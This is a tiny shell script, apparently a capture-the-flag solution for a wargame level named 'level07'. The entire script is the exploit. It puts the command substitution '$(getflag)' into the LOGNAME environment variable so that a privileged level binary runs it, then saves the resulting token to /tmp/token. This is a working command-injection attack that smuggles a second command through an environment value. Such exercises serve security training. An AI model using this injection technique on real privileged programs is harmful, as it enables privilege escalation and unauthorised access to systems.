#!/bin/sh -eu

env LOGNAME='$(getflag)' /home/user/level07/level07 \
| egrep -o '[^ ]+$' >/tmp/token
